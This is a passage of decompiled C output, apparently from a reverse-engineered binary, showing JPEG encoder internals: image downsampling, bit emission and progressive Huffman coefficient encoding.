  for (local_c = 0; local_c < *(int *)(param_2 + 0xc); local_c = local_c + 1) {
    uVar10 = 1;
    puVar7 = (undefined *)*local_18;
    pbVar5 = *local_1c;
    pbVar8 = local_1c[1];
    local_10 = 0;
    if (uVar6 != 0) {
      do {
        pbVar1 = pbVar5 + 1;
        bVar3 = *pbVar5;
        pbVar5 = pbVar5 + 2;
        bVar4 = *pbVar8;
        pbVar2 = pbVar8 + 1;
        pbVar8 = pbVar8 + 2;
        iVar9 = (uint)bVar3 + (uint)*pbVar1 + (uint)bVar4 + (uint)*pbVar2 + uVar10;
        uVar10 = uVar10 ^ 3;
        *puVar7 = (char)(iVar9 >> 2);
        puVar7 = puVar7 + 1;
        local_10 = local_10 + 1;
      } while (local_10 < uVar6);
    }
    local_1c = local_1c + 2;
    local_18 = local_18 + 1;
  }
  return;
}



void FUN_00431984(int param_1,int param_2,byte **param_3,int *param_4)

{
  int iVar1;
  undefined *puVar2;
  byte *pbVar3;
  byte *pbVar4;
  byte *pbVar5;
  byte *pbVar6;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *pbVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  byte **local_30;
  int *local_2c;
  int local_c;
  
  iVar1 = *(int *)(param_2 + 0x1c);
  FUN_00431608((int *)(param_3 + -1),*(int *)(param_1 + 0xe8) + 2,*(int *)(param_1 + 0x1c),
               iVar1 << 4);
  iVar11 = *(int *)(param_1 + 0xbc) * 0x10;
  iVar12 = *(int *)(param_1 + 0xbc) * -0x50 + 0x4000;
  local_2c = param_4;
  local_30 = param_3;
  for (local_c = 0; local_c < *(int *)(param_2 + 0xc); local_c = local_c + 1) {
    puVar2 = (undefined *)*local_2c;
    pbVar3 = *local_30;
    pbVar4 = local_30[2];
    pbVar5 = local_30[1];
    pbVar6 = local_30[-1];
    *puVar2 = (char)(((uint)*pbVar3 + (uint)pbVar3[1] + (uint)*pbVar5 + (uint)pbVar5[1]) * iVar12 +
                     (((uint)*pbVar6 + (uint)pbVar6[1] + (uint)*pbVar4 + (uint)pbVar4[1] +
                       (uint)*pbVar3 + (uint)pbVar3[2] + (uint)*pbVar5 + (uint)pbVar5[2]) * 2 +
                     (uint)*pbVar6 + (uint)pbVar6[2] + (uint)*pbVar4 + (uint)pbVar4[2]) * iVar11 +
                     0x8000 >> 0x10);
    iVar13 = iVar1 * 8 + -2;
    while( true ) {
      puVar2 = puVar2 + 1;
      pbVar10 = pbVar4 + 2;
      pbVar9 = pbVar6 + 2;
      pbVar8 = pbVar5 + 2;
      pbVar7 = pbVar3 + 2;
      if (iVar13 == 0) break;
      *puVar2 = (char)(((uint)*pbVar7 + (uint)pbVar3[3] + (uint)*pbVar8 + (uint)pbVar5[3]) * iVar12
                       + (((uint)*pbVar9 + (uint)pbVar6[3] + (uint)*pbVar10 + (uint)pbVar4[3] +
                           (uint)pbVar3[1] + (uint)pbVar3[4] + (uint)pbVar5[1] + (uint)pbVar5[4]) *
                          2 + (uint)pbVar6[1] + (uint)pbVar6[4] + (uint)pbVar4[1] + (uint)pbVar4[4])
                         * iVar11 + 0x8000 >> 0x10);
      iVar13 = iVar13 + -1;
      pbVar3 = pbVar7;
      pbVar5 = pbVar8;
      pbVar6 = pbVar9;
      pbVar4 = pbVar10;
    }
    *puVar2 = (char)(((uint)*pbVar7 + (uint)pbVar3[3] + (uint)*pbVar8 + (uint)pbVar5[3]) * iVar12 +
                     (((uint)*pbVar9 + (uint)pbVar6[3] + (uint)*pbVar10 + (uint)pbVar4[3] +
                       (uint)pbVar3[1] + (uint)pbVar3[3] + (uint)pbVar5[1] + (uint)pbVar5[3]) * 2 +
                     (uint)pbVar6[1] + (uint)pbVar6[3] + (uint)pbVar4[1] + (uint)pbVar4[3]) * iVar11
                     + 0x8000 >> 0x10);
    local_30 = local_30 + 2;
    local_2c = local_2c + 1;
  }
  return;
}



void FUN_00431c14(int param_1,int param_2,byte **param_3,int *param_4)

{
  byte bVar1;
  undefined *puVar2;
  byte *pbVar3;
  byte *pbVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  byte *pbVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  byte **local_38;
  int *local_34;
  int local_c;
  
  iVar10 = *(int *)(param_2 + 0x1c) * 8;
  FUN_00431608((int *)(param_3 + -1),*(int *)(param_1 + 0xe8) + 2,*(int *)(param_1 + 0x1c),iVar10);
  iVar8 = *(int *)(param_1 + 0xbc) * -0x200 + 0x10000;
  iVar5 = *(int *)(param_1 + 0xbc) * 0x40;
  local_34 = param_4;
  local_38 = param_3;
  for (local_c = 0; local_c < *(int *)(param_2 + 0xc); local_c = local_c + 1) {
    puVar2 = (undefined *)*local_34;
    uVar6 = (uint)**local_38;
    pbVar9 = *local_38 + 1;
    pbVar3 = local_38[1] + 1;
    pbVar4 = local_38[-1] + 1;
    iVar11 = (uint)*local_38[-1] + (uint)*local_38[1] + uVar6;
    iVar12 = (uint)*pbVar4 + (uint)*pbVar3 + (uint)*pbVar9;
    *puVar2 = (char)(uVar6 * iVar8 + ((iVar11 * 2 - uVar6) + iVar12) * iVar5 + 0x8000 >> 0x10);
    for (iVar7 = iVar10 + -2; puVar2 = puVar2 + 1, iVar7 != 0; iVar7 = iVar7 + -1) {
      bVar1 = *pbVar9;
      pbVar9 = pbVar9 + 1;
      pbVar4 = pbVar4 + 1;
      pbVar3 = pbVar3 + 1;
      iVar13 = (uint)*pbVar4 + (uint)*pbVar3 + (uint)*pbVar9;
      *puVar2 = (char)((uint)bVar1 * iVar8 + ((iVar12 - (uint)bVar1) + iVar11 + iVar13) * iVar5 +
                       0x8000 >> 0x10);
      iVar11 = iVar12;
      iVar12 = iVar13;
    }
    *puVar2 = (char)((uint)*pbVar9 * iVar8 + ((iVar12 * 2 - (uint)*pbVar9) + iVar11) * iVar5 +
                     0x8000 >> 0x10);
    local_38 = local_38 + 1;
    local_34 = local_34 + 1;
  }
  return;
}



undefined4 * FUN_00431da4(int *param_1)

{
  bool bVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  code **ppcVar6;
  
  bVar1 = true;
  puVar2 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x34);
  param_1[0x58] = (int)puVar2;
  *puVar2 = &DAT_00431604;
  puVar2[1] = FUN_00431658;
  puVar2[2] = 0;
  if (param_1[0x2e] != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x19;
    (**(code **)*param_1)();
  }
  iVar5 = param_1[0x10];
  ppcVar6 = (code **)(puVar2 + 3);
  puVar3 = puVar2;
  for (iVar4 = 0; iVar4 < param_1[0xe]; iVar4 = iVar4 + 1) {
    puVar3 = *(undefined4 **)(iVar5 + 8);
    if ((puVar3 == (undefined4 *)param_1[0x39]) && (*(int *)(iVar5 + 0xc) == param_1[0x3a])) {
      if (param_1[0x2f] == 0) {
        *ppcVar6 = FUN_004317ec;
      }
      else {
        *ppcVar6 = FUN_00431c14;
        puVar2[2] = 1;
      }
    }
    else {
      puVar3 = (undefined4 *)(*(int *)(iVar5 + 8) * 2);
      if ((puVar3 == (undefined4 *)param_1[0x39]) && (*(int *)(iVar5 + 0xc) == param_1[0x3a])) {
        bVar1 = false;
        *ppcVar6 = FUN_00431838;
      }
      else {
        puVar3 = (undefined4 *)(*(int *)(iVar5 + 8) * 2);
        if ((puVar3 == (undefined4 *)param_1[0x39]) && (*(int *)(iVar5 + 0xc) * 2 == param_1[0x3a]))
        {
          if (param_1[0x2f] == 0) {
            *ppcVar6 = FUN_004318cc;
          }
          else {
            *ppcVar6 = FUN_00431984;
            puVar2[2] = 1;
          }
        }
        else if ((param_1[0x39] % *(int *)(iVar5 + 8) == 0) &&
                (puVar3 = (undefined4 *)(param_1[0x3a] / *(int *)(iVar5 + 0xc)),
                param_1[0x3a] % *(int *)(iVar5 + 0xc) == 0)) {
          bVar1 = false;
          *ppcVar6 = FUN_004316dc;
        }
        else {
          *(undefined4 *)(*param_1 + 0x14) = 0x26;
          puVar3 = (undefined4 *)(**(code **)*param_1)();
        }
      }
    }
    ppcVar6 = ppcVar6 + 1;
    iVar5 = iVar5 + 0x54;
  }
  if ((param_1[0x2f] != 0) && (!bVar1)) {
    *(undefined4 *)(*param_1 + 0x14) = 99;
    puVar3 = (undefined4 *)(**(code **)(*param_1 + 4))(param_1,0);
  }
  return puVar3;
}



void FUN_004323c8(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x30);
  param_1[0x59] = (int)puVar1;
  *puVar1 = &LAB_00431f2c;
  if (param_1[0x30] == 1) {
    puVar1[1] = &LAB_004320e4;
    puVar1[2] = &LAB_00432f18;
  }
  else if (param_1[0x30] == 2) {
    puVar1[1] = &LAB_00432238;
    puVar1[7] = &LAB_00433184;
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x30;
    (**(code **)*param_1)();
  }
  iVar2 = 0;
  puVar1 = puVar1 + 3;
  do {
    iVar2 = iVar2 + 1;
    *puVar1 = 0;
    puVar1[5] = 0;
    puVar1 = puVar1 + 1;
  } while (iVar2 < 4);
  return;
}



void FUN_004325cc(int param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  
  puVar1 = *(undefined4 **)(*(int *)(param_1 + 0x20) + 0x18);
  iVar3 = (*(code *)puVar1[3])();
  if (iVar3 == 0) {
    piVar2 = *(int **)(param_1 + 0x20);
    *(undefined4 *)(*piVar2 + 0x14) = 0x18;
    (**(code **)*piVar2)();
  }
  *(undefined4 *)(param_1 + 0x10) = *puVar1;
  *(undefined4 *)(param_1 + 0x14) = puVar1[1];
  return;
}



void FUN_004325fc(int param_1,uint param_2,int param_3)

{
  int *piVar1;
  undefined *puVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  
  iVar3 = *(int *)(param_1 + 0x1c);
  if (param_3 == 0) {
    piVar1 = *(int **)(param_1 + 0x20);
    *(undefined4 *)(*piVar1 + 0x14) = 0x28;
    (**(code **)*piVar1)();
  }
  if (*(int *)(param_1 + 0xc) == 0) {
    iVar3 = iVar3 + param_3;
    uVar4 = (param_2 & (1 << ((byte)param_3 & 0x1f)) - 1U) << (0x18U - (char)iVar3 & 0x1f) |
            *(uint *)(param_1 + 0x18);
    for (; 7 < iVar3; iVar3 = iVar3 + -8) {
      puVar2 = *(undefined **)(param_1 + 0x10);
      *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
      uVar5 = (int)uVar4 >> 0x10 & 0xff;
      *puVar2 = (char)uVar5;
      piVar1 = (int *)(param_1 + 0x14);
      *piVar1 = *piVar1 + -1;
      if (*piVar1 == 0) {
        FUN_004325cc(param_1);
      }
      if (uVar5 == 0xff) {
        puVar2 = *(undefined **)(param_1 + 0x10);
        *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
        *puVar2 = 0;
        piVar1 = (int *)(param_1 + 0x14);
        *piVar1 = *piVar1 + -1;
        if (*piVar1 == 0) {
          FUN_004325cc(param_1);
        }
      }
      uVar4 = uVar4 << 8;
    }
    *(uint *)(param_1 + 0x18) = uVar4;
    *(int *)(param_1 + 0x1c) = iVar3;
  }
  return;
}



void FUN_00432698(int param_1)

{
  FUN_004325fc(param_1,0x7f,7);
  *(undefined4 *)(param_1 + 0x18) = 0;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  return;
}



void FUN_004326b8(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  if (*(int *)(param_1 + 0xc) != 0) {
    piVar1 = (int *)(*(int *)(param_1 + 0x5c + param_2 * 4) + param_3 * 4);
    *piVar1 = *piVar1 + 1;
    return;
  }
  iVar2 = *(int *)(param_1 + 0x4c + param_2 * 4);
  FUN_004325fc(param_1,*(uint *)(iVar2 + param_3 * 4),(int)*(char *)(iVar2 + 0x400 + param_3));
  return;
}



void FUN_004326e4(int param_1,char *param_2,int param_3)

{
  if ((*(int *)(param_1 + 0xc) == 0) && (param_3 != 0)) {
    do {
      FUN_004325fc(param_1,(int)*param_2,1);
      param_2 = param_2 + 1;
      param_3 = param_3 + -1;
    } while (param_3 != 0);
  }
  return;
}



void FUN_00432710(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  
  iVar2 = *(int *)(param_1 + 0x38);
  if (iVar2 != 0) {
    iVar3 = 0;
    while (iVar2 = iVar2 >> 1, iVar2 != 0) {
      iVar3 = iVar3 + 1;
    }
    if (0xe < iVar3) {
      piVar1 = *(int **)(param_1 + 0x20);
      *(undefined4 *)(*piVar1 + 0x14) = 0x28;
      (**(code **)*piVar1)();
    }
    FUN_004326b8(param_1,*(int *)(param_1 + 0x34),iVar3 << 4);
    if (iVar3 != 0) {
      FUN_004325fc(param_1,*(uint *)(param_1 + 0x38),iVar3);
    }
    *(undefined4 *)(param_1 + 0x38) = 0;
    FUN_004326e4(param_1,*(char **)(param_1 + 0x40),*(int *)(param_1 + 0x3c));
    *(undefined4 *)(param_1 + 0x3c) = 0;
  }
  return;
}



void FUN_00432774(int param_1,char param_2)

{
  int *piVar1;
  undefined *puVar2;
  char *pcVar3;
  undefined4 *puVar4;
  int iVar5;
  
  FUN_00432710(param_1);
  if (*(int *)(param_1 + 0xc) == 0) {
    FUN_00432698(param_1);
    puVar2 = *(undefined **)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
    *puVar2 = 0xff;
    piVar1 = (int *)(param_1 + 0x14);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004325cc(param_1);
    }
    pcVar3 = *(char **)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + 1;
    *pcVar3 = param_2 + -0x30;
    piVar1 = (int *)(param_1 + 0x14);
    *piVar1 = *piVar1 + -1;
    if (*piVar1 == 0) {
      FUN_004325cc(param_1);
    }
  }
  if (*(int *)(*(int *)(param_1 + 0x20) + 0x138) == 0) {
    puVar4 = (undefined4 *)(param_1 + 0x24);
    for (iVar5 = 0; iVar5 < *(int *)(*(int *)(param_1 + 0x20) + 0xf0); iVar5 = iVar5 + 1) {
      *puVar4 = 0;
      puVar4 = puVar4 + 1;
    }
    return;
  }
  *(undefined4 *)(param_1 + 0x38) = 0;
  *(undefined4 *)(param_1 + 0x3c) = 0;
  return;
}



undefined4 FUN_004327f4(int *param_1,short **param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  uint local_24;
  int local_20;
  short **local_14;
  int *local_10;
  
  iVar1 = param_1[0x5a];
  iVar2 = param_1[0x51];
  *(undefined4 *)(iVar1 + 0x10) = *(undefined4 *)param_1[6];
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(param_1[6] + 4);
  if ((param_1[0x31] != 0) && (*(int *)(iVar1 + 0x44) == 0)) {
    FUN_00432774(iVar1,(char)*(undefined4 *)(iVar1 + 0x48));
  }
  local_10 = param_1 + 0x44;
  local_14 = param_2;
  for (local_20 = 0; local_20 < param_1[0x43]; local_20 = local_20 + 1) {
    iVar7 = *local_10;
    iVar3 = param_1[iVar7 + 0x3d];
    iVar5 = (int)**local_14 >> ((byte)iVar2 & 0x1f);
    local_24 = iVar5 - *(int *)(iVar1 + 0x24 + iVar7 * 4);
    *(int *)(iVar1 + 0x24 + iVar7 * 4) = iVar5;
    uVar6 = local_24;
    if ((int)local_24 < 0) {
      uVar6 = -local_24;
      local_24 = local_24 - 1;
    }
    iVar7 = 0;
    for (; uVar6 != 0; uVar6 = (int)uVar6 >> 1) {
      iVar7 = iVar7 + 1;
    }
    if (0xb < iVar7) {
      *(undefined4 *)(*param_1 + 0x14) = 6;
      (**(code **)*param_1)();
    }
    FUN_004326b8(iVar1,*(int *)(iVar3 + 0x14),iVar7);
    if (iVar7 != 0) {
      FUN_004325fc(iVar1,local_24,iVar7);
    }
    local_10 = local_10 + 1;
    local_14 = local_14 + 1;
  }
  puVar4 = (undefined4 *)param_1[6];
  *puVar4 = *(undefined4 *)(iVar1 + 0x10);
  puVar4[1] = *(undefined4 *)(iVar1 + 0x14);
  if (param_1[0x31] != 0) {
    if (*(int *)(iVar1 + 0x44) == 0) {
      *(int *)(iVar1 + 0x44) = param_1[0x31];
      *(int *)(iVar1 + 0x48) = *(int *)(iVar1 + 0x48) + 1;
      *(uint *)(iVar1 + 0x48) = *(uint *)(iVar1 + 0x48) & 7;
    }
    *(int *)(iVar1 + 0x44) = *(int *)(iVar1 + 0x44) + -1;
  }
  return 1;
}



undefined4 FUN_00432928(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  uint local_28;
  
  iVar1 = param_1[0x5a];
  iVar2 = param_1[0x4f];
  iVar3 = param_1[0x51];
  *(undefined4 *)(iVar1 + 0x10) = *(undefined4 *)param_1[6];
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(param_1[6] + 4);
  if ((param_1[0x31] != 0) && (*(int *)(iVar1 + 0x44) == 0)) {
    FUN_00432774(iVar1,(char)*(undefined4 *)(iVar1 + 0x48));
  }
  iVar4 = *param_2;
  iVar8 = 0;
  iVar5 = param_1[0x4e];
  piVar7 = &DAT_00440da8 + iVar5;
  for (; iVar5 <= iVar2; iVar5 = iVar5 + 1) {
    iVar9 = (int)*(short *)(iVar4 + *piVar7 * 2);
    if (iVar9 == 0) {
      iVar8 = iVar8 + 1;
    }
    else {
      if (iVar9 < 0) {
        uVar10 = -iVar9 >> ((byte)iVar3 & 0x1f);
        local_28 = ~uVar10;
      }
      else {
        uVar10 = iVar9 >> ((byte)iVar3 & 0x1f);
        local_28 = uVar10;
      }
      if (uVar10 == 0) {
        iVar8 = iVar8 + 1;
      }
      else {
        if (*(int *)(iVar1 + 0x38) != 0) {
          FUN_00432710(iVar1);
        }
        for (; 0xf < iVar8; iVar8 = iVar8 + -0x10) {
          FUN_004326b8(iVar1,*(int *)(iVar1 + 0x34),0xf0);
        }
        iVar9 = 1;
        while (uVar10 = (int)uVar10 >> 1, uVar10 != 0) {
          iVar9 = iVar9 + 1;
        }
        if (10 < iVar9) {
          *(undefined4 *)(*param_1 + 0x14) = 6;
          (**(code **)*param_1)();
        }
        FUN_004326b8(iVar1,*(int *)(iVar1 + 0x34),iVar8 * 0x10 + iVar9);
        FUN_004325fc(iVar1,local_28,iVar9);
        iVar8 = 0;
      }
    }
    piVar7 = piVar7 + 1;
  }
  if ((0 < iVar8) &&
     (*(int *)(iVar1 + 0x38) = *(int *)(iVar1 + 0x38) + 1, *(int *)(iVar1 + 0x38) == 0x7fff)) {
    FUN_00432710(iVar1);
  }
  puVar6 = (undefined4 *)param_1[6];
  *puVar6 = *(undefined4 *)(iVar1 + 0x10);
  puVar6[1] = *(undefined4 *)(iVar1 + 0x14);
  if (param_1[0x31] != 0) {
    if (*(int *)(iVar1 + 0x44) == 0) {
      *(int *)(iVar1 + 0x44) = param_1[0x31];
      *(int *)(iVar1 + 0x48) = *(int *)(iVar1 + 0x48) + 1;
      *(uint *)(iVar1 + 0x48) = *(uint *)(iVar1 + 0x48) & 7;
    }
    *(int *)(iVar1 + 0x44) = *(int *)(iVar1 + 0x44) + -1;
  }
  return 1;
}



undefined4 FUN_00432ad4(int param_1,short **param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  int iVar4;
  
  iVar1 = *(int *)(param_1 + 0x168);
  uVar2 = *(undefined4 *)(param_1 + 0x144);
  *(undefined4 *)(iVar1 + 0x10) = **(undefined4 **)(param_1 + 0x18);
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0x18) + 4);
  if ((*(int *)(param_1 + 0xc4) != 0) && (*(int *)(iVar1 + 0x44) == 0)) {
    FUN_00432774(iVar1,(char)*(undefined4 *)(iVar1 + 0x48));
  }
  for (iVar4 = 0; iVar4 < *(int *)(param_1 + 0x10c); iVar4 = iVar4 + 1) {
    FUN_004325fc(iVar1,(int)**param_2 >> ((byte)uVar2 & 0x1f),1);
    param_2 = param_2 + 1;
  }
  puVar3 = *(undefined4 **)(param_1 + 0x18);
  *puVar3 = *(undefined4 *)(iVar1 + 0x10);
  puVar3[1] = *(undefined4 *)(iVar1 + 0x14);
  if (*(int *)(param_1 + 0xc4) != 0) {
    if (*(int *)(iVar1 + 0x44) == 0) {
      *(int *)(iVar1 + 0x44) = *(int *)(param_1 + 0xc4);
      *(int *)(iVar1 + 0x48) = *(int *)(iVar1 + 0x48) + 1;
      *(uint *)(iVar1 + 0x48) = *(uint *)(iVar1 + 0x48) & 7;
    }
    *(int *)(iVar1 + 0x44) = *(int *)(iVar1 + 0x44) + -1;
  }
  return 1;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 FUN_00432b7c(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  undefined4 *puVar7;
  int *piVar8;
  int *piVar9;
  char *pcVar10;
  int iVar11;
  int iVar12;
  int local_12c;
  int local_124;
  int aiStack272 [64];
  
  iVar1 = *(int *)(param_1 + 0x168);
  iVar2 = *(int *)(param_1 + 0x13c);
  uVar3 = *(undefined4 *)(param_1 + 0x144);
  *(undefined4 *)(iVar1 + 0x10) = **(undefined4 **)(param_1 + 0x18);
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0x18) + 4);
  if ((*(int *)(param_1 + 0xc4) != 0) && (*(int *)(iVar1 + 0x44) == 0)) {
    FUN_00432774(iVar1,(char)*(undefined4 *)(iVar1 + 0x48));
  }
  iVar4 = *param_2;
  local_124 = 0;
  iVar5 = *(int *)(param_1 + 0x138);
  piVar9 = aiStack272 + iVar5;
  piVar8 = &DAT_00440da8 + iVar5;
  for (; iVar5 <= iVar2; iVar5 = iVar5 + 1) {
    local_12c = (int)*(short *)(iVar4 + *piVar8 * 2);
    if (local_12c < 0) {
      local_12c = -local_12c;
    }
    local_12c = local_12c >> ((byte)uVar3 & 0x1f);
    *piVar9 = local_12c;
    if (local_12c == 1) {
      local_124 = iVar5;
    }
    piVar9 = piVar9 + 1;
    piVar8 = piVar8 + 1;
  }
  pcVar10 = (char *)(*(int *)(iVar1 + 0x40) + *(int *)(iVar1 + 0x3c));
  iVar12 = 0;
  iVar5 = *(int *)(param_1 + 0x138);
  iVar11 = 0;
  piVar8 = &DAT_00440da8 + iVar5;
  piVar9 = aiStack272 + iVar5;
  for (; iVar5 <= iVar2; iVar5 = iVar5 + 1) {
    iVar6 = *piVar9;
    if (iVar6 == 0) {
      iVar12 = iVar12 + 1;
    }
    else {
      while ((0xf < iVar12 && (iVar5 <= local_124))) {
        FUN_00432710(iVar1);
        FUN_004326b8(iVar1,*(int *)(iVar1 + 0x34),0xf0);
        iVar12 = iVar12 + -0x10;
        FUN_004326e4(iVar1,pcVar10,iVar11);
        pcVar10 = *(char **)(iVar1 + 0x40);
        iVar11 = 0;
      }
      if (iVar6 < 2) {
        FUN_00432710(iVar1);
        FUN_004326b8(iVar1,*(int *)(iVar1 + 0x34),iVar12 * 0x10 + 1);
        FUN_004325fc(iVar1,(uint)(-1 < *(short *)(iVar4 + *piVar8 * 2)),1);
        FUN_004326e4(iVar1,pcVar10,iVar11);
        pcVar10 = *(char **)(iVar1 + 0x40);
        iVar11 = 0;
        iVar12 = 0;
      }
      else {
        local_12c._0_1_ = (byte)iVar6;
        pcVar10[iVar11] = (byte)local_12c & 1;
        iVar11 = iVar11 + 1;
      }
    }
    piVar8 = piVar8 + 1;
    piVar9 = piVar9 + 1;
  }
  if ((0 < iVar12) || (iVar11 != 0)) {
    *(int *)(iVar1 + 0x38) = *(int *)(iVar1 + 0x38) + 1;
    *(int *)(iVar1 + 0x3c) = *(int *)(iVar1 + 0x3c) + iVar11;
    if ((*(int *)(iVar1 + 0x38) == 0x7fff) || (0x3a9 < *(uint *)(iVar1 + 0x3c))) {
      FUN_00432710(iVar1);
    }
  }
  puVar7 = *(undefined4 **)(param_1 + 0x18);
  *puVar7 = *(undefined4 *)(iVar1 + 0x10);
  puVar7[1] = *(undefined4 *)(iVar1 + 0x14);
  if (*(int *)(param_1 + 0xc4) != 0) {
    if (*(int *)(iVar1 + 0x44) == 0) {
      *(int *)(iVar1 + 0x44) = *(int *)(param_1 + 0xc4);
      *(int *)(iVar1 + 0x48) = *(int *)(iVar1 + 0x48) + 1;
      *(uint *)(iVar1 + 0x48) = *(uint *)(iVar1 + 0x48) & 7;
    }
    *(int *)(iVar1 + 0x44) = *(int *)(iVar1 + 0x44) + -1;
  }
  return 1;
}



void FUN_00432dd8(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  iVar1 = *(int *)(param_1 + 0x168);
  *(undefined4 *)(iVar1 + 0x10) = **(undefined4 **)(param_1 + 0x18);
  *(undefined4 *)(iVar1 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0x18) + 4);
  FUN_00432710(iVar1);
  FUN_00432698(iVar1);
  puVar2 = *(undefined4 **)(param_1 + 0x18);
  *puVar2 = *(undefined4 *)(iVar1 + 0x10);
  puVar2[1] = *(undefined4 *)(iVar1 + 0x14);
  return;
}



void FUN_00432e14(int *param_1)

{
  int iVar1;
  undefined uVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int *piVar6;
  bool bVar7;
  int local_24;
  int local_20 [4];
  
  iVar1 = param_1[0x5a];
  uVar2 = FUN_00432710(iVar1);
  bVar7 = param_1[0x4e] == 0;
  FUN_00420fb0(uVar2,bVar7,(char)local_20,local_20,0,0x10);
  local_24 = 0;
  piVar5 = param_1 + 0x3d;
  do {
    if (param_1[0x3c] <= local_24) {
      return;
    }
    if (bVar7) {
      if (param_1[0x50] == 0) {
        iVar4 = *(int *)(*piVar5 + 0x14);
        goto LAB_00432e79;
      }
    }
    else {
      iVar4 = *(int *)(*piVar5 + 0x18);
LAB_00432e79:
      if (local_20[iVar4] == 0) {
        if (bVar7) {
          iVar3 = iVar4 + 0x15;
        }
        else {
          iVar3 = iVar4 + 0x19;
        }
        piVar6 = param_1 + iVar3;
        if (*piVar6 == 0) {
          iVar3 = FUN_0042dcb4((int)param_1);
          *piVar6 = iVar3;
        }
        FUN_00433e50(param_1,*piVar6,*(int **)(iVar1 + 0x5c + iVar4 * 4));
        local_20[iVar4] = 1;
      }
    }
    local_24 = local_24 + 1;
    piVar5 = piVar5 + 1;
  } while( true );
}



void FUN_00432ed4(int param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x6c);
  iVar3 = 0;
  *(undefined4 **)(param_1 + 0x168) = puVar1;
  *puVar1 = &LAB_00432444;
  puVar2 = puVar1 + 0x13;
  do {
    iVar3 = iVar3 + 1;
    *puVar2 = 0;
    puVar2[4] = 0;
    puVar2 = puVar2 + 1;
  } while (iVar3 < 4);
  puVar1[0x10] = 0;
  return;
}



void FUN_00433640(int *param_1,int param_2,int param_3,int *param_4)

{
  byte bVar1;
  int iVar2;
  int iVar3;
  char *pcVar4;
  int *extraout_EDX;
  int *extraout_EDX_00;
  int *piVar5;
  int iVar6;
  uint uVar7;
  int *piVar8;
  byte *pbVar9;
  int local_534 [257];
  char local_130 [260];
  char *local_2c;
  int *local_28;
  int *local_24;
  int local_20;
  int local_1c;
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int *local_8;
  
  local_c = param_2;
  local_8 = param_1;
  if ((param_3 < 0) || (3 < param_3)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x32;
    *(int *)(iVar2 + 0x18) = param_3;
    (**(code **)*param_1)();
  }
  if (local_c == 0) {
    local_10 = local_8[param_3 + 0x19];
  }
  else {
    local_10 = local_8[param_3 + 0x15];
  }
  if (local_10 == 0) {
    iVar2 = *local_8;
    *(undefined4 *)(iVar2 + 0x14) = 0x32;
    *(int *)(iVar2 + 0x18) = param_3;
    (**(code **)*local_8)();
  }
  if (*param_4 == 0) {
    iVar2 = (**(code **)local_8[1])(local_8,1,0x500);
    *param_4 = iVar2;
  }
  local_14 = *param_4;
  local_18 = 0;
  piVar8 = (int *)0x1;
  piVar5 = (int *)(local_10 + 1);
  local_24 = piVar5;
  do {
    bVar1 = *(byte *)local_24;
    if (0x100 < (int)((uint)bVar1 + local_18)) {
      *(undefined4 *)(*local_8 + 0x14) = 8;
      (**(code **)*local_8)();
      piVar5 = extraout_EDX;
    }
    pcVar4 = local_130 + local_18;
    uVar7 = (uint)bVar1;
    while (uVar7 != 0) {
      local_18 = local_18 + 1;
      *pcVar4 = (char)piVar8;
      pcVar4 = pcVar4 + 1;
      piVar5 = piVar8;
      uVar7 = uVar7 - 1;
    }
    piVar8 = (int *)((int)piVar8 + 1);
    local_24 = (int *)((int)local_24 + 1);
  } while ((int)piVar8 < 0x11);
  local_130[local_18] = '\0';
  iVar2 = 0;
  iVar3 = (int)local_130[0];
  local_1c = iVar3;
  iVar6 = 0;
  while (local_130[iVar6] != '\0') {
    piVar5 = local_534 + iVar6;
    for (pcVar4 = local_130 + iVar6; *pcVar4 == local_1c; pcVar4 = pcVar4 + 1) {
      *piVar5 = iVar2;
      iVar6 = iVar6 + 1;
      piVar5 = piVar5 + 1;
      iVar2 = iVar2 + 1;
    }
    iVar3 = 1 << ((byte)local_1c & 0x1f);
    if (iVar3 <= iVar2) {
      *(undefined4 *)(*local_8 + 0x14) = 8;
